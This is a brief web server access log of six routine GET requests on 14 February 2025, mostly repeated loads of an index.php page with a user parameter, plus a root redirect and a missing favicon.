94.65.186.77 - - [14/Feb/2025:20:23:53 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1262 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
135.148.10.174 - - [14/Feb/2025:20:24:33 +0200] "GET / HTTP/1.1" 302 5 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
94.65.186.77 - - [14/Feb/2025:20:29:41 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1382 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
94.65.186.77 - - [14/Feb/2025:20:29:45 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1382 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
51.81.215.75 - - [14/Feb/2025:20:31:09 +0200] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0" "-"
94.65.186.77 - - [14/Feb/2025:20:31:45 +0200] "GET /index.php?user=leyekab HTTP/1.1" 200 1414 "https://65.109.103.156/index.php?user=leyekab" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" "-"
